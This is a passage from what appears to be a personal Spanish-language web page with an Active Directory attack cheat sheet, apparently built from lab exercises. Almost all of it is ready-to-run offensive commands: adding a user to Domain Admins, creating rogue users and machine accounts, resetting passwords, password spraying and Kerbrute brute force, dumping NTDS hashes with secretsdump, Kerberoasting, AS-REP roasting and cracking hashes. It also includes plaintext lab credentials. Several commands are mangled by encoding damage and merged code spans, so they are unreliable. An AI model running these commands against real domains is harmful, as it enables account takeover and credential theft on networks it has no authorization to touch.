<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> add_to_group</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">CN=usuario,CN=Users,DC=DOMINIO,DC=LOCAL</span><span style="color:#E9F284">"</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">CN=Domain Admins,CN=Users,DC=DOMINIO,DC=LOCAL</span><span style="color:#E9F284">"</span></span>
<span class="line"></span></code></pre>
<p>âš¡ Exploitation/Machine account creation</p>
<p>Crear una cuenta de mÃ¡quina en AD:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> create_computer</span><span style="color:#F1FA8C"> NUEVOPC</span><span style="color:#F8F8F2">$ </span><span style="color:#F1FA8C">Password@123</span></span></code></pre>
<p>âš¡ Exploitation/User creation</p>
<p>Crear un nuevo usuario de dominio:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> create_user</span><span style="color:#F1FA8C"> fakeuser</span><span style="color:#F1FA8C"> Password@123</span></span></code></pre>
<p>âš¡ Exploitation/Password reset</p>
<p>Resetear la contraseÃ±a de un usuario sin conocer la anterior:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> modify_password</span><span style="color:#F1FA8C"> fakeuser</span><span style="color:#F1FA8C"> Password@1</span></span></code></pre>
<p>âš¡ Exploitation/Account unlock</p>
<p>Desbloquear cuentas bloqueadas:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> unlock</span><span style="color:#F1FA8C"> usuario</span></span></code></pre>
<hr>
<h2 id="1ï¸âƒ£-acceso-remoto">1ï¸âƒ£ Acceso remoto</h2>
<p>Conectarse al escritorio remoto (RDP):</p>
<p><code>xfreerdp /u:Administrator /p:Password321 /v:10.10.224.147:3389</code></p>
<hr>
<h2 id="2ï¸âƒ£-enumeraciÃ³n-de-recursos-y-usuarios">2ï¸âƒ£ EnumeraciÃ³n de recursos y usuarios</h2>
<h3 id="recursos-compartidos">Recursos compartidos</h3>
<p><code>smbmap -H 10.10.224.147 -u 'Administrator' -p 'Password321'  </code>netexec smb 10.10.224.147 -u â€˜Administratorâ€™ -p â€˜Password321â€™ â€”shares`</p>
<h3 id="enumerar-usuarios-y-servidores">Enumerar usuarios y servidores</h3>
<p><code>netexec smb 10.10.224.147 -u 'Administrator' -p 'Password321' --rid-brute</code></p>
<hr>
<h2 id="3ï¸âƒ£-gestiÃ³n-de-contraseÃ±as">3ï¸âƒ£ GestiÃ³n de contraseÃ±as</h2>
<h3 id="cambiar-contraseÃ±a-de-un-usuario">Cambiar contraseÃ±a de un usuario</h3>
<p><code>Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password')</code></p>
<p>Alternativa usando <strong>BloodyAD</strong>:</p>
<p><code>bloodyAD --host '10.10.224.147' -u 'philip' -p 'Claire2008' set password sophie 'Bea123'</code></p>
<hr>
<h2 id="4ï¸âƒ£-reconocimiento-avanzado">4ï¸âƒ£ Reconocimiento avanzado</h2>
<h3 id="escaneo-de-usuarios-y-contraseÃ±as-con-crackmapexec">Escaneo de usuarios y contraseÃ±as con CrackMapExec</h3>
<ul>
<li>Enumerar usuarios del dominio:</li>
</ul>
<p><code>crackmapexec smb IP(AD) -u usuarios.txt -p diccionario.txt --continue-on-success</code></p>
<ul>
<li>Solo en un equipo local:</li>
</ul>
<p><code>crackmapexec smb IP -u usuarios.txt -p diccionario.txt --local-auth</code></p>
<ul>
<li>Comprobar privilegios y polÃ­tica de contraseÃ±as:</li>
</ul>
<p><code>crackmapexec smb IP -u usuario -p '1234' --continue-on-success </code>
<code>crackmapexec smb IP -u usuario -p '1234' --pass-pol </code>
<code>crackmapexec smb IP -u usuario -p '1234' --users </code></p>
<ul>
<li>Dumpear la base de datos del dominio:</li>
</ul>
<p><code>crackmapexec smb IP(AD) -u usuario -p '1234' --ntds</code></p>
<p>Formato de la respuesta: <code>Usuario:ID:LM HASH:NTHASH</code><br>
Si LM = <code>404ee</code> â†’ LM deshabilitado</p>
<hr>
<h3 id="historial-de-contraseÃ±as">Historial de contraseÃ±as</h3>
<p><code>impacket-secretsdump -just-dc usuario:password@IP -history -pwd-last-secret</code></p>
<hr>
<h3 id="ataques-kerberos-sin-ser-admin">Ataques Kerberos (sin ser admin)</h3>
<ul>
<li>Obtener SPN y TGS:</li>
</ul>
<p><code>impacket-GetUserSPNs -dc-ip IP(AD) dominio.com/usuario:'1234' -request</code></p>
<ul>
<li>Crackear hash:</li>
</ul>
<p><code>hashcat -m 13100 --force -a 0 hash diccionario.txt john --format=krb5tgs --wordlist=diccionario.txt hash</code></p>
<hr>
<h3 id="kerbrute-fuerza-bruta-de-kerberos">Kerbrute (fuerza bruta de Kerberos)</h3>
<p><code>python3 kerbrute.py -users userlist.txt -passwords passwordlist.txt -domain spookysec.local -t 100</code></p>
<hr>
<h3 id="ataque-de-usuarios-sin-contraseÃ±a-as-rep-roasting">Ataque de usuarios sin contraseÃ±a (AS-REP Roasting)</h3>
<p><code>impacket-GetNPUsers spookysec.local/svc-admin -no-pass john --wordlist=/rockyou.txt hash</code></p>
<hr>
<h2 id="5ï¸âƒ£-validaciÃ³n-de-credenciales">5ï¸âƒ£ ValidaciÃ³n de credenciales</h2>
<ul>
<li>Probar acceso con SMB:</li>
</ul>
<p><code>crackmapexec smb IP -u 'svc-admin' -p 'ContraseÃ±a'  </code>smbclient -L spooky.local â€”user â€˜svc-adminâ€™ â€”password â€˜contraseÃ±aâ€™`</p>
<ul>
<li>Acceder a un recurso compartido:</li>
</ul>
<p><code>smbclient \\\\spooky.local\\backup --user svc-admin --password management2005</code></p>
<ul>
<li>Dumpear credenciales desde un recurso:</li>
</ul>
<p><code>impacket-secretsdump -just-dc backup@spookysec.local</code></p>
<hr> </div> <div class="mt-16 pt-8 border-t border-slate-800"> <a href="/projects" class="text-slate-400 hover:text-accentBlue transition-colors">
â† Volver a la lista de proyectos
</a> </div> </article>   </div> </article> </main> <footer class="w-full py-6 mt-12"> <div class="container mx-auto text-sm text-slate-400">
Â© 2026 Angel Corral - Todos los derechos reservados.
</div> </footer> </div> </body></html>